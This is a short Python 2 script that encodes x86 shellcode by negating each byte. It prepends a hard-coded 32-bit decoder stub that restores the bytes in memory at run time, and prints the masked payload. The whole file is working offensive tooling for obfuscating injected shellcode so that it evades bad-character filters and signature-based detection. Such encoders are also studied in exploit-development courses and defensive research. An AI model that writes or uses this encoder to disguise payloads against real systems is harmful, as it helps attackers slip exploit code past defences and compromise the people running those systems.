import sys

def decoder(arch):
	if arch != 32:
		print "neg_short: Error, not implemented yet"
		sys.exit(1)
	return "\x8b\x74\x24\xfc\x83\xc6\x0b\x46\xf6\x1e\x75\xfb"

argc = len(sys.argv) - 1
if argc != 1 and argc != 2:
	print "Usage:\n\tpython " + sys.argv[0] + " \\x..\\x... " + "ARCH"
	sys.exit(1)

sc = "".join(c if (c != "\\" and c != "x") else "" for c in sys.argv[1]).decode("hex")
ARCH = int(sys.argv[2])

negated_code = ""
for k in range(len(sc)):
	if ord(sc[k]) == 0:
		negated_code += sc[k:]
		break
	negated_code += chr(256 - ord(sc[k]))

neg_sc = decoder(ARCH) + negated_code
print "masked_shellcode =\n\"" + "".join("\\x" + c.encode("hex") for c in neg_sc) + "\""
print "Total length: " + str(len(neg_sc)) + " bytes."
